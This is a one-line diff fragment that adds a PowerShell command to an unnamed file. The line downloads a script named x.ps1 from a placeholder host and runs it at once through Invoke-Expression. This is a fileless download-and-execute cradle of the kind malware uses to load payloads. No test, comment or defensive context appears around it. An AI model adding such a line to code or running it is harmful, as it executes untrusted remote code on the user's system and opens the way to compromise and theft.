@@ -1,0 +1,1 @@
+IEX (iwr 'http://df1-example.test/x.ps1' -useb)
